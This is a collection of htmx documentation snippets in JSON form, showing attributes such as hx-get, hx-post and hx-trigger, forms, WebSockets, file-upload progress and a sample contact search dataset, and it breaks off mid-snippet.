[
  {
    "owner": "bigskysoftware",
    "repo": "htmx",
    "content": "TITLE: Triggering AJAX with Standard Event (click) - HTML\nDESCRIPTION: This code snippet demonstrates how to trigger an AJAX GET request to '/clicked' when the div element is clicked.  The hx-trigger attribute is set to 'click', which listens for the standard DOM click event on the element.  No dependencies or prerequisites are needed beyond including the htmx library.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/attributes/hx-trigger.md#_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<div hx-get=\"/clicked\" hx-trigger=\"click\">Click Me</div>\n```\n\n----------------------------------------\n\nTITLE: Validating URL with htmx:validateUrl event in JavaScript\nDESCRIPTION: This JavaScript snippet demonstrates how to use the `htmx:validateUrl` event to validate the URL of an htmx request. It checks if the request is to the same host or to a specific allowed domain (myserver.com). If the URL doesn't meet the criteria, the request is prevented by calling `preventDefault()`.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/events.md#_snippet_4\n\nLANGUAGE: javascript\nCODE:\n```\ndocument.body.addEventListener('htmx:validateUrl', function (evt) {\n  // only allow requests to the current server as well as myserver.com\n  if (!evt.detail.sameHost && evt.detail.url.hostname !== \"myserver.com\") {\n    evt.preventDefault();\n  }\n});\n```\n\n----------------------------------------\n\nTITLE: Setting HX-Redirect Header\nDESCRIPTION: This example demonstrates how to set the `HX-Redirect` header in an HTTP response. Setting this header triggers a full page reload to the specified URL on the client side. This is useful when redirecting to non-htmx endpoints or when a full browser reload is necessary.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/headers/hx-redirect.md#_snippet_0\n\nLANGUAGE: html\nCODE:\n```\nHX-Redirect: /test\n```\n\n----------------------------------------\n\nTITLE: htmx Button Example with Attributes\nDESCRIPTION: This example demonstrates how to use htmx attributes to enhance a button's functionality. When the button is clicked, it issues an HTTP POST request to '/clicked', replacing the element with the id 'parent-div' with the response.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/docs.md#_snippet_1\n\nLANGUAGE: HTML\nCODE:\n```\n<button hx-post=\"/clicked\"\n    hx-trigger=\"click\"\n    hx-target=\"#parent-div\"\n    hx-swap=\"outerHTML\">\n    Click Me!\n</button>\n```\n\n----------------------------------------\n\nTITLE: htmx Select Elements\nDESCRIPTION: This HTML snippet defines two select elements, 'make' and 'model'. The 'make' select uses hx-get to make a GET request to the '/models' endpoint when its value changes, updating the 'model' select with the response.  The hx-indicator attribute displays a loading indicator during the request.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/value-select.md#_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<div>\n    <label >Make</label>\n    <select name=\"make\" hx-get=\"/models\" hx-target=\"#models\" hx-indicator=\".htmx-indicator\">\n      <option value=\"audi\">Audi</option>\n      <option value=\"toyota\">Toyota</option>\n      <option value=\"bmw\">BMW</option>\n    </select>\n  </div>\n  <div>\n    <label>Model</label>\n    <select id=\"models\" name=\"model\">\n      <option value=\"a1\">A1</option>\n      ...\n    </select>\n    <img class=\"htmx-indicator\" width=\"20\" src=\"/img/bars.svg\">\n</div>\n```\n\n----------------------------------------\n\nTITLE: Resetting Form Input after Request (HTML)\nDESCRIPTION: This HTML snippet shows how to reset a form after a successful HTMX request. It uses the `hx-on::after-request` attribute to listen for the `afterRequest` event. If the request is successful (20x status code), the `this.reset()` method is called on the form element to clear its inputs.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/reset-user-input.md#_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<form hx-post=\"/note\"\n      hx-target=\"#notes\" \n      hx-swap=\"afterbegin\"\n      hx-on::after-request=\"if(event.detail.successful) this.reset()\">\n    <div class=\"form-group\">\n        <label>Add a note</label>\n        <input type=\"text\" name=\"note-text\" placeholder=\"blank canvas\">\n    </div>\n    <button class=\"btn\">Add</button>\n</form>\n<ul id=\"notes\"><!-- Response will go here --></ul>\n```\n\n----------------------------------------\n\nTITLE: Multiple Triggers with Options - HTML\nDESCRIPTION: This example demonstrates using multiple triggers separated by commas.  The code will load `/news` immediately on page load, and then again with a delay of one second after each click. Each trigger gets its own options.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/attributes/hx-trigger.md#_snippet_8\n\nLANGUAGE: html\nCODE:\n```\n  <div hx-get=\"/news\" hx-trigger=\"load, click delay:1s\"></div>\n```\n\n----------------------------------------\n\nTITLE: HTML Form Structure for Inline Validation\nDESCRIPTION: This HTML snippet defines a form with an email input field that uses HTMX to post the input value to the server for validation. The `hx-post` attribute specifies the endpoint, `hx-target` sets the target for the response, and `hx-swap` defines the swap strategy. An indicator is also included to show loading state.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/inline-validation.md#_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<form hx-post=\"/contact\">\n  <div hx-target=\"this\" hx-swap=\"outerHTML\">\n    <label>Email Address</label>\n    <input name=\"email\" hx-post=\"/contact/email\" hx-indicator=\"#ind\">\n    <img id=\"ind\" src=\"/img/bars.svg\" class=\"htmx-indicator\"/>\n  </div>\n  <div class=\"form-group\">\n    <label>First Name</label>\n    <input type=\"text\" class=\"form-control\" name=\"firstName\">\n  </div>\n  <div class=\"form-group\">\n    <label>Last Name</label>\n    <input type=\"text\" class=\"form-control\" name=\"lastName\">\n  </div>\n  <button class=\"btn primary\">Submit</button>\n</form>\n```\n\n----------------------------------------\n\nTITLE: Edit Contact Form with HTMX\nDESCRIPTION: This HTML form allows editing of contact details and uses HTMX to submit the changes to `/contact/1` using a PUT request. The `hx-target` attribute ensures the form is replaced with the server's response, and `hx-swap` is set to `outerHTML`. A cancel button fetches the display view using another HTMX GET request.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/click-to-edit.md#_snippet_1\n\nLANGUAGE: html\nCODE:\n```\n<form hx-put=\"/contact/1\" hx-target=\"this\" hx-swap=\"outerHTML\">\n  <div>\n    <label>First Name</label>\n    <input type=\"text\" name=\"firstName\" value=\"Joe\">\n  </div>\n  <div class=\"form-group\">\n    <label>Last Name</label>\n    <input type=\"text\" name=\"lastName\" value=\"Blow\">\n  </div>\n  <div class=\"form-group\">\n    <label>Email Address</label>\n    <input type=\"email\" name=\"email\" value=\"joe@blow.com\">\n  </div>\n  <button class=\"btn\">Submit</button>\n  <button class=\"btn\" hx-get=\"/contact/1\">Cancel</button>\n</form>\n```\n\n----------------------------------------\n\nTITLE: Filtering Events with Combined Javascript Expressions - HTML\nDESCRIPTION: This code snippet demonstrates combining Javascript expressions to filter an event. The AJAX request to `/clicked` is triggered only when both the `ctrlKey` and `shiftKey` properties of the click event are true (i.e., both Control and Shift keys are pressed during the click).\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/attributes/hx-trigger.md#_snippet_3\n\nLANGUAGE: html\nCODE:\n```\n<div hx-get=\"/clicked\" hx-trigger=\"click[ctrlKey&&shiftKey]\">Control-Shift Click Me</div>\n```\n\n----------------------------------------\n\nTITLE: Load Polling with htmx\nDESCRIPTION: This HTML snippet demonstrates load polling, where an element triggers a GET request upon loading and replaces itself with the response. The hx-get attribute specifies the URL, hx-trigger is set to 'load delay:1s' to initiate the request after a 1-second delay, and hx-swap is set to 'outerHTML' to replace the entire element with the server response. This is useful for scenarios where polling terminates at a certain point.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/docs.md#_snippet_15\n\nLANGUAGE: html\nCODE:\n```\n<div hx-get=\"/messages\"\n    hx-trigger=\"load delay:1s\"\n    hx-swap=\"outerHTML\">\n</div>\n```\n\n----------------------------------------\n\nTITLE: Triggering AJAX on Input Change with Delay - HTML\nDESCRIPTION: This example shows how to trigger an AJAX GET request to '/search' on input change, but only if the value has changed and after a 1-second delay. This is useful for search boxes. The hx-target attribute specifies that the response should be appended to the div with the id 'search-results'.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/attributes/hx-trigger.md#_snippet_4\n\nLANGUAGE: html\nCODE:\n```\n<input name=\"q\"\n       hx-get=\"/search\" hx-trigger=\"input changed delay:1s\"\n       hx-target=\"#search-results\"/>\n```\n\n----------------------------------------\n\nTITLE: Adding Dynamic Values to htmx Request with hx-vals using JavaScript\nDESCRIPTION: This example shows how to add a dynamic value to an htmx request using the hx-vals attribute with JavaScript. The JavaScript expression 'calculateValue()' will be evaluated and its result will be assigned to the 'myVal' parameter in the GET request to '/example'. Requires the `calculateValue()` function to be defined.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/attributes/hx-vals.md#_snippet_1\n\nLANGUAGE: HTML\nCODE:\n```\n  <div hx-get=\"/example\" hx-vals='js:{myVal: calculateValue()}'>Get Some HTML, Including a Dynamic Value from Javascript in the Request</div>\n```\n\n----------------------------------------\n\nTITLE: Using the htmx WebSockets extension\nDESCRIPTION: This snippet illustrates how to use the WebSockets extension.  The `hx-ext=\"ws\"` attribute enables the extension on the parent div. The `ws-connect` attribute establishes a WebSocket connection to the specified URL.  The `ws-send` attribute on the form indicates that form values should be serialized as JSON and sent to the WebSocket upon submission.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/extensions/ws.md#_snippet_3\n\nLANGUAGE: html\nCODE:\n```\n<div hx-ext=\"ws\" ws-connect=\"/chatroom\">\n    <div id=\"notifications\"></div>\n    <div id=\"chat_room\">\n        ...\n    </div>\n    <form id=\"form\" ws-send>\n        <input name=\"chat_message\">\n    </form>\n</div>\n```\n\n----------------------------------------\n\nTITLE: HTML Delete Button with HTMX Delete Request\nDESCRIPTION: This HTML snippet represents a delete button within a table row. It uses the `hx-delete` attribute to send a DELETE request to a specific URL when clicked, simulating the deletion of a contact.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/delete-row.md#_snippet_2\n\nLANGUAGE: html\nCODE:\n```\n<tr>\n  <td>Angie MacDowell</td>\n  <td>angie@macdowell.org</td>\n  <td>Active</td>\n  <td>\n    <button class=\"btn danger\" hx-delete=\"/contact/1\">\n      Delete\n    </button>\n  </td>\n</tr>\n```\n\n----------------------------------------\n\nTITLE: Simulating Data Storage and Search in Javascript\nDESCRIPTION: This JavaScript code simulates a data store containing contact information and a function `findContactsMatching` that returns an array of contacts whose first name, last name, or email matches the search term. The `dataStore` is initialized with a set of contact details.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/active-search.md#_snippet_4\n\nLANGUAGE: javascript\nCODE:\n```\n     var dataStore = function(){\n          var data = [\n            { \"FirstName\": \"Venus\", \"LastName\": \"Grimes\", \"Email\": \"lectus.rutrum@Duisa.edu\", \"City\": \"Ankara\" },\n            { \"FirstName\": \"Fletcher\", \"LastName\": \"Owen\", \"Email\": \"metus@Aenean.org\", \"City\": \"Niort\" },\n            { \"FirstName\": \"William\", \"LastName\": \"Hale\", \"Email\": \"eu.dolor@risusodio.edu\", \"City\": \"Te Awamutu\" },\n            { \"FirstName\": \"TaShya\", \"LastName\": \"Cash\", \"Email\": \"tincidunt.orci.quis@nuncnullavulputate.co.uk\", \"City\": \"Titagarh\" },\n            { \"FirstName\": \"Kevyn\", \"LastName\": \"Hoover\", \"Email\": \"tristique.pellentesque.tellus@Cumsociis.co.uk\", \"City\": \"Cuenca\" },\n            { \"FirstName\": \"Jakeem\", \"LastName\": \"Walker\", \"Email\": \"Morbi.vehicula.Pellentesque@faucibusorci.org\", \"City\": \"St. Andrä\" },\n            { \"FirstName\": \"Malcolm\", \"LastName\": \"Trujillo\", \"Email\": \"sagittis@velit.edu\", \"City\": \"Fort Resolution\" },\n            { \"FirstName\": \"Wynne\", \"LastName\": \"Rice\", \"Email\": \"augue.id@felisorciadipiscing.edu\", \"City\": \"Kinross\" },\n            { \"FirstName\": \"Evangeline\", \"LastName\": \"Klein\", \"Email\": \"adipiscing.lobortis@sem.org\", \"City\": \"San Giovanni in Galdo\" },\n            { \"FirstName\": \"Jennifer\", \"LastName\": \"Russell\", \"Email\": \"sapien.Aenean.massa@risus.com\", \"City\": \"Laives/Leifers\" },\n            { \"FirstName\": \"Rama\", \"LastName\": \"Freeman\", \"Email\": \"Proin@quamPellentesquehabitant.net\", \"City\": \"Flin Flon\" },\n            { \"FirstName\": \"Jena\", \"LastName\": \"Mathis\", \"Email\": \"non.cursus.non@Phaselluselit.com\", \"City\": \"Fort Simpson\" },\n            { \"FirstName\": \"Alexandra\", \"LastName\": \"Maynard\", \"Email\": \"porta.elit.a@anequeNullam.ca\", \"City\": \"Nazilli\" },\n            { \"FirstName\": \"Tallulah\", \"LastName\": \"Haley\", \"Email\": \"ligula@id.net\", \"City\": \"Bay Roberts\" },\n            { \"FirstName\": \"Timon\", \"LastName\": \"Small\", \"Email\": \"velit.Quisque.varius@gravidaPraesent.org\", \"City\": \"Girona\" },\n            { \"FirstName\": \"Randall\", \"LastName\": \"Pena\", \"Email\": \"facilisis@Donecconsectetuer.edu\", \"City\": \"Edam\" },\n            { \"FirstName\": \"Conan\", \"LastName\": \"Vaughan\", \"Email\": \"luctus.sit@Classaptenttaciti.edu\", \"City\": \"Nadiad\" },\n            { \"FirstName\": \"Dora\", \"LastName\": \"Allen\", \"Email\": \"est.arcu.ac@Vestibulumante.co.uk\", \"City\": \"Renfrew\" },\n            { \"FirstName\": \"Aiko\", \"LastName\": \"Little\", \"Email\": \"quam.dignissim@convallisest.net\", \"City\": \"Delitzsch\" },\n            { \"FirstName\": \"Jessamine\", \"LastName\": \"Bauer\", \"Email\": \"taciti.sociosqu@nibhvulputatemauris.co.uk\", \"City\": \"Offida\" },\n            { \"FirstName\": \"Gillian\", \"LastName\": \"Livingston\", \"Email\": \"justo@atiaculisquis.com\", \"City\": \"Saskatoon\" },\n            { \"FirstName\": \"Laith\", \"LastName\": \"Nicholson\", \"Email\": \"elit.pellentesque.a@diam.org\", \"City\": \"Tallahassee\" },\n            { \"FirstName\": \"Paloma\", \"LastName\": \"Alston\", \"Email\": \"cursus@metus.org\", \"City\": \"Cache Creek\" },\n            { \"FirstName\": \"Freya\", \"LastName\": \"Dunn\", \"Email\": \"Vestibulum.accumsan@metus.co.uk\", \"City\": \"Heist-aan-Zee\" },\n            { \"FirstName\": \"Griffin\", \"LastName\": \"Rice\", \"Email\": \"justo@tortordictumeu.net\", \"City\": \"Montpelier\" },\n            { \"FirstName\": \"Catherine\", \"LastName\": \"West\", \"Email\": \"malesuada.augue@elementum.com\", \"City\": \"Tarnów\" },\n            { \"FirstName\": \"Jena\", \"LastName\": \"Chambers\", \"Email\": \"erat.Etiam.vestibulum@quamelementumat.net\", \"City\": \"Konya\" },\n            { \"FirstName\": \"Neil\", \"LastName\": \"Rodriguez\", \"Email\": \"enim@facilisis.com\", \"City\": \"Kraków\" },\n            { \"FirstName\": \"Freya\", \"LastName\": \"Charles\", \"Email\": \"metus@nec.net\", \"City\": \"Arzano\" },\n            { \"FirstName\": \"Anastasia\", \"LastName\": \"Strong\", \"Email\": \"sit@vitae.edu\", \"City\": \"Polpenazze del Garda\" },\n            { \"FirstName\": \"Bell\", \"LastName\": \"Simon\", \"Email\": \"mollis.nec.cursus@disparturientmontes.ca\", \"City\": \"Caxias do Sul\" },\n            { \"FirstName\": \"Minerva\", \"LastName\": \"Allison\", \"Email\": \"Donec@nequeIn.edu\", \"City\": \"Rio de Janeiro\" },\n            { \"FirstName\": \"Yoko\", \"LastName\": \"Dawson\", \"Email\": \"neque.sed@semper.net\", \"City\": \"Saint-Remy-Geest\" },\n            { \"FirstName\": \"Nadine\", \"LastName\": \"Justice\", \"Email\": \"netus@et.edu\", \"City\": \"Calgary\" },\n            { \"FirstName\": \"Hoyt\", \"LastName\": \"Rosa\", \"Email\": \"Nullam.ut.nisi@Aliquam.co.uk\", \"City\": \"Mold\" },\n            { \"FirstName\": \"Shafira\", \"LastName\": \"Noel\", \"Email\": \"tincidunt.nunc@non.edu\", \"City\": \"Kitzbühel\" },\n            { \"FirstName\": \"Jin\", \"LastName\": \"Nunez\", \"Email\": \"porttitor.tellus.non@venenatisamagna.net\", \"City\": \"Dreieich\" },\n            { \"FirstName\": \"Barbara\", \"LastName\": \"Gay\", \"Email\": \"est.congue.a@elit.com\", \"City\": \"Overland Park\" },\n            { \"FirstName\": \"Riley\", \"LastName\": \"Hammond\", \"Email\": \"tempor.diam@sodalesnisi.net\", \"City\": \"Smoky Lake\" },\n            { \"FirstName\": \"Molly\", \"LastName\": \"Fulton\", \"Email\": \"semper@Naminterdumenim.net\", \"City\": \"Montese\" },\n            { \"FirstName\": \"Dexter\", \"LastName\": \"Owen\", \"Email\": \"non.ante@odiosagittissemper.ca\", \"City\": \"Bousval\" },\n            { \"FirstName\": \"Kuame\", \"LastName\": \"Merritt\", \"Email\": \"ornare.placerat.orci@nisinibh.ca\", \"City\": \"Solingen\" },\n            { \"FirstName\": \"Maggie\", \"LastName\": \"Delgado\", \"Email\": \"Nam.ligula.elit@Cum.org\", \"City\": \"Tredegar\" },\n            { \"FirstName\": \"Hanae\", \"LastName\": \"Washington\", \"Email\": \"nec.euismod@adipiscingelit.org\", \"City\": \"Amersfoort\" },\n            { \"FirstName\": \"Jonah\", \"LastName\": \"Cherry\", \"Email\": \"ridiculus.mus.Proin@quispede.edu\", \"City\": \"Acciano\" },\n            { \"FirstName\": \"Cheyenne\", \"LastName\": \"Munoz\", \"Email\": \"at@molestiesodalesMauris.edu\", \"City\": \"Saint-L?onard\" },\n            { \"FirstName\": \"India\", \"LastName\": \"Mack\", \"Email\": \"sem.mollis@Inmi.co.uk\", \"City\": \"Maryborough\" },\n            { \"FirstName\": \"Lael\", \"LastName\": \"Mcneil\", \"Email\": \"porttitor@risusDonecegestas.com\", \"City\": \"Livorno\" },\n            { \"FirstName\": \"Jillian\", \"LastName\": \"Mckay\", \"Email\": \"vulputate.eu.odio@amagnaLorem.co.uk\", \"City\": \"Salvador\" },\n            { \"FirstName\": \"Shaine\", \"LastName\": \"Wright\", \"Email\": \"malesuada@pharetraQuisqueac.org\", \"City\": \"Newton Abbot\" },\n            { \"FirstName\": \"Keane\", \"LastName\": \"Richmond\", \"Email\": \"nostra.per.inceptos@euismodurna.org\", \"City\": \"Canterano\" },\n            { \"FirstName\": \"Samuel\", \"LastName\": \"Davis\", \"Email\": \"felis@euenim.com\", \"City\": \"Peterhead\" },\n            { \"FirstName\": \"Zelenia\", \"LastName\": \"Sheppard\", \"Email\": \"Quisque.nonummy@antelectusconvallis.org\", \"City\": \"Motta Visconti\" },\n            { \"FirstName\": \"Giacomo\", \"LastName\": \"Cole\", \"Email\": \"aliquet.libero@urnaUttincidunt.ca\", \"City\": \"Donnas\" },\n            \n          ];\n\n          this.findContactsMatching = function(search) {\n            var results = [];\n            for (var i = 0; i < data.length; i++) {\n              var contact = data[i];\n              if (contact.FirstName.toLowerCase().indexOf(search.toLowerCase()) > -1 ||\n                  contact.LastName.toLowerCase().indexOf(search.toLowerCase()) > -1 ||\n                  contact.Email.toLowerCase().indexOf(search.toLowerCase()) > -1) {\n                results.push(contact);\n              }\n            }\n            return results;\n          }\n        };\n```\n\n----------------------------------------\n\nTITLE: Defining Contact Data Array - JSON\nDESCRIPTION: This JSON snippet defines an array of contact objects. Each object contains contact information such as 'FirstName', 'LastName', 'Email', and 'City'. This data is used by the 'findContactsMatching' function to perform searches.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/active-search.md#_snippet_5\n\nLANGUAGE: JSON\nCODE:\n```\n            { \"FirstName\": \"Mason\", \"LastName\": \"Hinton\", \"Email\": \"est@Nunc.co.uk\", \"City\": \"St. Asaph\" },\n            { \"FirstName\": \"Katelyn\", \"LastName\": \"Koch\", \"Email\": \"velit.Aliquam@Suspendisse.edu\", \"City\": \"Cleveland\" },\n            { \"FirstName\": \"Olga\", \"LastName\": \"Spencer\", \"Email\": \"faucibus@Praesenteudui.net\", \"City\": \"Karapınar\" },\n            { \"FirstName\": \"Erasmus\", \"LastName\": \"Strong\", \"Email\": \"dignissim.lacus@euarcu.net\", \"City\": \"Passau\" },\n            { \"FirstName\": \"Regan\", \"LastName\": \"Cline\", \"Email\": \"vitae.erat.vel@lacusEtiambibendum.co.uk\", \"City\": \"Pergola\" },\n            { \"FirstName\": \"Stone\", \"LastName\": \"Holt\", \"Email\": \"eget.mollis.lectus@Aeneanegestas.ca\", \"City\": \"Houston\" },\n            { \"FirstName\": \"Deanna\", \"LastName\": \"Branch\", \"Email\": \"turpis@estMauris.net\", \"City\": \"Olcenengo\" },\n            { \"FirstName\": \"Rana\", \"LastName\": \"Green\", \"Email\": \"metus@conguea.edu\", \"City\": \"Onze-Lieve-Vrouw-Lombeek\" },\n            { \"FirstName\": \"Caryn\", \"LastName\": \"Henson\", \"Email\": \"Donec.sollicitudin.adipiscing@sed.net\", \"City\": \"Kington\" },\n            { \"FirstName\": \"Clarke\", \"LastName\": \"Stein\", \"Email\": \"nec@mollis.co.uk\", \"City\": \"Tenali\" },\n            { \"FirstName\": \"Kelsie\", \"LastName\": \"Porter\", \"Email\": \"Cum@gravidaAliquam.com\", \"City\": \"İskenderun\" },\n            { \"FirstName\": \"Cooper\", \"LastName\": \"Pugh\", \"Email\": \"Quisque.ornare.tortor@dictum.co.uk\", \"City\": \"Delhi\" },\n            { \"FirstName\": \"Paul\", \"LastName\": \"Spencer\", \"Email\": \"ac@InfaucibusMorbi.com\", \"City\": \"Biez\" },\n            { \"FirstName\": \"Cassady\", \"LastName\": \"Farrell\", \"Email\": \"Suspendisse.non@venenatisa.net\", \"City\": \"New Maryland\" },\n            { \"FirstName\": \"Sydnee\", \"LastName\": \"Velazquez\", \"Email\": \"mollis@loremfringillaornare.com\", \"City\": \"Strée\" },\n            { \"FirstName\": \"Felix\", \"LastName\": \"Boyle\", \"Email\": \"id.libero.Donec@aauctor.org\", \"City\": \"Edinburgh\" },\n            { \"FirstName\": \"Ryder\", \"LastName\": \"House\", \"Email\": \"molestie@natoquepenatibus.org\", \"City\": \"Copertino\" },\n            { \"FirstName\": \"Hadley\", \"LastName\": \"Holcomb\", \"Email\": \"penatibus@nisi.ca\", \"City\": \"Avadi\" },\n            { \"FirstName\": \"Marsden\", \"LastName\": \"Nunez\", \"Email\": \"Nulla.eget.metus@facilisisvitaeorci.org\", \"City\": \"New Galloway\" },\n            { \"FirstName\": \"Alana\", \"LastName\": \"Powell\", \"Email\": \"non.lobortis.quis@interdumfeugiatSed.net\", \"City\": \"Pitt Meadows\" },\n            { \"FirstName\": \"Dennis\", \"LastName\": \"Wyatt\", \"Email\": \"Morbi.non@nibhQuisquenonummy.ca\", \"City\": \"Wrexham\" },\n            { \"FirstName\": \"Karleigh\", \"LastName\": \"Walton\", \"Email\": \"nascetur.ridiculus@quamdignissimpharetra.com\", \"City\": \"Diksmuide\" },\n            { \"FirstName\": \"Brielle\", \"LastName\": \"Donovan\", \"Email\": \"placerat@at.edu\", \"City\": \"Kolmont\" },\n            { \"FirstName\": \"Donna\", \"LastName\": \"Dickerson\", \"Email\": \"lacus.pede.sagittis@lacusvestibulum.com\", \"City\": \"Vallepietra\" },\n            { \"FirstName\": \"Eagan\", \"LastName\": \"Pate\", \"Email\": \"est.Nunc@cursusNunc.ca\", \"City\": \"Durness\" },\n            { \"FirstName\": \"Carlos\", \"LastName\": \"Ramsey\", \"Email\": \"est.ac.facilisis@duinec.co.uk\", \"City\": \"Tiruvottiyur\" },\n            { \"FirstName\": \"Regan\", \"LastName\": \"Murphy\", \"Email\": \"lectus.Cum@aptent.com\", \"City\": \"Candidoni\" },\n            { \"FirstName\": \"Claudia\", \"LastName\": \"Spence\", \"Email\": \"Nunc.lectus.pede@aceleifend.co.uk\", \"City\": \"Augusta\" },\n            { \"FirstName\": \"Genevieve\", \"LastName\": \"Parker\", \"Email\": \"ultrices@inaliquetlobortis.net\", \"City\": \"Forbach\" },\n            { \"FirstName\": \"Marshall\", \"LastName\": \"Allison\", \"Email\": \"erat.semper.rutrum@odio.org\", \"City\": \"Landau\" },\n            { \"FirstName\": \"Reuben\", \"LastName\": \"Davis\", \"Email\": \"Donec@auctorodio.edu\", \"City\": \"Schönebeck\" },\n            { \"FirstName\": \"Ralph\", \"LastName\": \"Doyle\", \"Email\": \"pede.Suspendisse.dui@Curabitur.org\", \"City\": \"Linkebeek\" },\n            { \"FirstName\": \"Constance\", \"LastName\": \"Gilliam\", \"Email\": \"mollis@Nulla.edu\", \"City\": \"Enterprise\" },\n            { \"FirstName\": \"Serina\", \"LastName\": \"Jacobson\", \"Email\": \"dictum.augue@ipsum.net\", \"City\": \"Hérouville-Saint-Clair\" },\n            { \"FirstName\": \"Charity\", \"LastName\": \"Byrd\", \"Email\": \"convallis.ante.lectus@scelerisquemollisPhasellus.co.uk\", \"City\": \"Brussegem\" },\n            { \"FirstName\": \"Hyatt\", \"LastName\": \"Bird\", \"Email\": \"enim.Nunc.ut@nonmagnaNam.com\", \"City\": \"Gdynia\" },\n            { \"FirstName\": \"Brent\", \"LastName\": \"Dunn\", \"Email\": \"ac.sem@nuncid.com\", \"City\": \"Hay-on-Wye\" },\n            { \"FirstName\": \"Casey\", \"LastName\": \"Bonner\", \"Email\": \"id@ornareelitelit.edu\", \"City\": \"Kearny\" },\n            { \"FirstName\": \"Hakeem\", \"LastName\": \"Gill\", \"Email\": \"dis@nonummyipsumnon.org\", \"City\": \"Portico e San Benedetto\" },\n            { \"FirstName\": \"Stewart\", \"LastName\": \"Meadows\", \"Email\": \"Nunc.pulvinar.arcu@convallisdolorQuisque.net\", \"City\": \"Dignano\" },\n            { \"FirstName\": \"Nomlanga\", \"LastName\": \"Wooten\", \"Email\": \"inceptos@turpisegestas.ca\", \"City\": \"Troon\" },\n            { \"FirstName\": \"Sebastian\", \"LastName\": \"Watts\", \"Email\": \"Sed.diam.lorem@lorem.co.uk\", \"City\": \"Palermo\" },\n            { \"FirstName\": \"Chelsea\", \"LastName\": \"Larsen\", \"Email\": \"ligula@Nam.net\", \"City\": \"Poole\" },\n            { \"FirstName\": \"Cameron\", \"LastName\": \"Humphrey\", \"Email\": \"placerat@id.org\", \"City\": \"Manfredonia\" },\n            { \"FirstName\": \"Juliet\", \"LastName\": \"Bush\", \"Email\": \"consectetuer.euismod@vitaeeratVivamus.co.uk\", \"City\": \"Lavacherie\" },\n            { \"FirstName\": \"Caryn\", \"LastName\": \"Hooper\", \"Email\": \"eu.enim.Etiam@ridiculus.org\", \"City\": \"Amelia\" }\n\n```\n\n----------------------------------------\n\nTITLE: GET Request with hx-get in htmx\nDESCRIPTION: This HTML snippet demonstrates how to use the `hx-get` attribute to trigger a GET request to the `/example` endpoint when the button is clicked. The HTML returned from the server will be swapped into the `innerHTML` of the button element. No specific dependencies are required beyond the htmx library itself.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/attributes/hx-get.md#_snippet_0\n\nLANGUAGE: HTML\nCODE:\n```\n  <button hx-get=\"/example\">Get Some HTML</button>\n```\n\n----------------------------------------\n\nTITLE: Include htmx and create a POST button\nDESCRIPTION: This snippet demonstrates how to include the htmx library and create a button that sends a POST request to the '/clicked' endpoint when clicked. The `hx-swap` attribute specifies that the entire button should be replaced with the response from the server.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/README.md#_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n  <script src=\"https://unpkg.com/htmx.org@2.0.4\"></script>\n  <!-- have a button POST a click via AJAX -->\n  <button hx-post=\"/clicked\" hx-swap=\"outerHTML\">\n    Click Me\n  </button>\n```\n\n----------------------------------------\n\nTITLE: Initializing Progress Bar - HTML\nDESCRIPTION: This HTML snippet defines the initial state of the progress bar, including a button that sends a POST request to the `/start` endpoint when clicked. The `hx-target` attribute specifies that the current element should be updated, and `hx-swap` specifies that the outer HTML should be replaced with the response from the server. This initiates the progress bar workflow.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/progress-bar.md#_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<div hx-target=\"this\" hx-swap=\"outerHTML\">\n  <h3>Start Progress</h3>\n  <button class=\"btn primary\" hx-post=\"/start\">\n            Start Job\n  </button>\n</div>\n```\n\n----------------------------------------\n\nTITLE: File Upload Form with JavaScript and HTMX\nDESCRIPTION: This snippet demonstrates a file upload form using HTMX and JavaScript. It includes a form with `multipart/form-data` encoding, a file input, a button to trigger the upload, and a progress bar.  The JavaScript code listens for the `htmx:xhr:progress` event and updates the progress bar's value attribute based on the loaded and total bytes of the file being uploaded. Dependencies: HTMX library.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/file-upload.md#_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n    <form id='form' hx-encoding='multipart/form-data' hx-post='/upload'>\n        <input type='file' name='file'>\n        <button>\n            Upload\n        </button>\n        <progress id='progress' value='0' max='100'></progress>\n    </form>\n    <script>\n        htmx.on('#form', 'htmx:xhr:progress', function(evt) {\n          htmx.find('#progress').setAttribute('value', evt.detail.loaded/evt.detail.total * 100)\n        });\n    </script>\n```\n\n----------------------------------------\n\nTITLE: Issue AJAX Request - htmx.ajax() - JavaScript\nDESCRIPTION: This code snippet illustrates how to make an AJAX request using the `htmx.ajax()` method. It shows different ways to specify the target element and how to execute a callback function after the content has been inserted into the DOM. It returns a Promise.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/api.md#_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\n// issue a GET to /example and put the response HTML into #myDiv\nhtmx.ajax('GET', '/example', '#myDiv')\n\n// issue a GET to /example and replace #myDiv with the response\nhtmx.ajax('GET', '/example', {target:'#myDiv', swap:'outerHTML'})\n\n// execute some code after the content has been inserted into the DOM\nhtmx.ajax('GET', '/example', '#myDiv').then(() => {\n  // this code will be executed after the 